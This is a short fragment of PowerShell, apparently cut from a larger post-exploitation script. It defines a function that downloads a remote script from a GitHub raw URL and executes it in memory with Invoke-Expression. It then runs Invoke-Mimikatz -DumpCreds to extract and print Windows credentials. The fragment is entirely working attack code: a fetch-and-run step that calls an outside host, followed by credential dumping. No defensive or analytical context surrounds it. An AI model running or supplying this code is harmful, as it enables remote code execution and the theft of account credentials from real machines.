...
Function sub_Credentials_Mimikatz() {
    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/basti1-b/scripts/master/mim2.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m
}
